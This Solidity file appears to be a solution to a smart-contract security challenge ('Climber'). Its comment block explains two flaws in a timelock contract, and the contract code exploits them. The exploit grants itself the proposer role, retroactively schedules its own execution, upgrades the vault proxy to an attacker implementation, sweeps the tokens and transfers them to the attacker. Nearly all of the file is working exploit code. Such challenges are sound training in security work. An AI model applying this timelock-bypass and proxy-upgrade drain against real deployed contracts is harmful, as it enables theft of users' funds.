// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../ClimberTimelock.sol";
import "../ClimberVault.sol";
import "./MeticulousVaultImpl.sol";

contract Meticulous {
    /**
    The vulnerabilities with the `ClimberTimelock` are:
    1. `getOperationState()` should check if the time, at which a scheduled task is permitted to be executed (`ReadyForExecution`), is at most equal to the current time. However, the function does the opposite.

    In other words, it assigns `ReadyForExecution` to all tasks that are within (and NOT outside) the scheduled task's permit timestamp.

    2. `execute()` executes all calls first (based on execution data), then checks if the provided execution data was stored as a permitted scheduled task.

    It overlooks the case where the execution data is such, that by the end of the execution, it permits itself (with the ID pre-computed), given how the Climber admin of `PROPOSER_ROLE`, so it can assign itself `PROPOSER_ROLE`. :P

    With these vulnerabilities, these are the attack stages:

    1. Prepare execution data for following transactions (in sequence), then call `execute()` on ClimberTimelock with these:

        a) `grantRole()` called on ClimberTimelock, granting `PROPOSER_ROLE` to AttackContract (since ClimberTimelock is admin for `PROPOSER_ROLE`, so it has permission to do so)

        target: ClimberTimelock
        value: 0
        dataElement: abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(AttackContract));

        b) `callbackFromClimberTimelock()` called on AttackContract, which in turn, now being a proposer, proposes a scheduled task to ClimberTimelock with same data as (a) and (b) in this step, in order to legitimise this entire transaction (i.e, having a record against generated ID).

        target: AttackContract
        value: 0
        dataElement: abi.encodeWithSignature("callbackFromClimberTimelock()");

    2. In `callbackFromClimberTimelock()`, do these in sequence:

        a) Call `schedule()` on ClimberTimelock with arguments as stated in (a) and (b) in step #1. This will not cause a revert when `execute()` on ClimberTimelock checks if such an action (as in Step #1) was scheduled ever.

        b) `schedule()` and `execute()` on ClimberTimelock to upgrade ClimberVault's implementation contract to a custom implementation, making sure the `sweeper` is the Attack contract.

        c) Call `sweepFunds()` on ClimberVault.

        d) Transfer DVT to attacker.

     */

    ClimberVault climberVaultProxy;
    IERC20 dvtContract;

    constructor(ClimberVault _climberVault, IERC20 _dvtContract) {
        climberVaultProxy = _climberVault;
        dvtContract = _dvtContract;
    }

    /**
    @dev Starts attack
     */
    function startAttack() external {
        //////////
        // STAGE 1
        //////////
        _getProposerRole(
            ClimberTimelock(payable(climberVaultProxy.owner())),
            true
        );
    }

    /**
    @dev Called by Timelock after first stage
     */
    function callbackFromClimberTimelock() external {
        //////////
        // STAGE 2
        //////////

        // Schedule task to legitimise Stage 1 action
        _getProposerRole(ClimberTimelock(payable(msg.sender)), false);

        // Deploy custom ClimberVault implementation and upgrade legitimate ClimberVault proxy's implementation to above custom implementation
        _upgradeClimberVaultProxy();

        // Sweep all tokens
        climberVaultProxy.sweepFunds(address(dvtContract));

        // Transfer funds to attacker
        _transferFundsToAttacker();
    }

    ///////////////////////
    // HELPERS ////////////
    ///////////////////////

    /**
    @dev Assigns PROPOSER_ROLE to this contract
     */
    function _getProposerRole(
        ClimberTimelock _climberTimelock,
        bool _isStageOne
    ) internal {
        address[] memory targets = new address[](2);
        targets[0] = address(_climberTimelock);
        targets[1] = address(this);

        uint256[] memory values = new uint256[](2);

        bytes[] memory dataElements = new bytes[](2);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            _climberTimelock.PROPOSER_ROLE(),
            address(this)
        );
        dataElements[1] = abi.encodeWithSignature(
            "callbackFromClimberTimelock()"
        );

        bytes32 salt = bytes32(0);

        if (_isStageOne) {
            _climberTimelock.execute(targets, values, dataElements, salt);
        } else {
            _climberTimelock.schedule(targets, values, dataElements, salt);
        }
    }

    /**
    @dev Upgrades ClimberVault proxy's implementation to a custom one deployed by attacker
     */
    function _upgradeClimberVaultProxy() internal {
        // Deploy custom implementation
        MeticulousVaultImpl meticulousVaultCustomImpl = new MeticulousVaultImpl();

        // Prepare arguments
        address[] memory targets = new address[](1);
        targets[0] = address(climberVaultProxy);

        uint256[] memory values = new uint256[](1);

        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(meticulousVaultCustomImpl)
        );

        bytes32 salt = bytes32(0);

        // Execute upgrade
        ClimberTimelock climberTimelock = ClimberTimelock(
            payable(climberVaultProxy.owner())
        );
        climberTimelock.schedule(targets, values, dataElements, salt);
        climberTimelock.execute(targets, values, dataElements, salt);
    }

    /**
    @dev Transfers all funds to attacker
     */
    function _transferFundsToAttacker() internal {
        dvtContract.transfer(tx.origin, dvtContract.balanceOf(address(this)));
    }
}
